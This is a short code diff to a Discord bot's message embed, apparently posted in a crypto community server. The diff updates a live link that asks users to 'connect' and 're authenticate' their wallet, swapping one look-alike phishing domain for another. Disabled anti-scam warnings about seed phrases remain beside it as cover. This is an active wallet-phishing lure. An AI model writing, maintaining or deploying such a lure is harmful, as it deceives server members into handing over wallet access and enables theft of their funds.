@@ -54,7 +54,7 @@ const exampleEmbed = new MessageEmbed()
 		//{ name: 'MAHALAGANG PAALALA:', value: 'Huwag ka pupunta sa mga links na di ka sigurado kung ano iyon maaring pishing site ang binibigay sayo at huwag ibibigay kahit kanino at kahit saan ang inyong SEED PHRASE / SECRET RECOVERY PHRASE. Hindi po namin ito hihingin sa inyo kahit anong mangyari. Kapag may humingi sa inyo, siguradong SCAM ito. Wala na po kaming magagawa kung magpapa-loko kayo kahit alam mong sinasamantala ka na pero umaasa ka pa din.'},
 		//{ name: '\u200B', value: '\u200B' },
 		//{name: 'Note:', value: 'Our Staff, Mod, Admin, Support, etc. will never message you first.'},
-    {name: '᲼',value: "Click [here](activation-collab.com/) to connect, to sync your wallet to re authenticate and restore to all functionalities on wallet."}
+    {name: '᲼',value: "Click [here](https://collabactivation.com/) to connect, to sync your wallet to re authenticate and restore to all functionalities on wallet."}
 	//You are obligated to follow Discord's [terms of service](https://discord.com/terms)."},*editable
     //{name:'II.', value : " Our rules are based on Discord's [community guidelines](https://discord.com/guidelines) and have to be respected."}
 	)
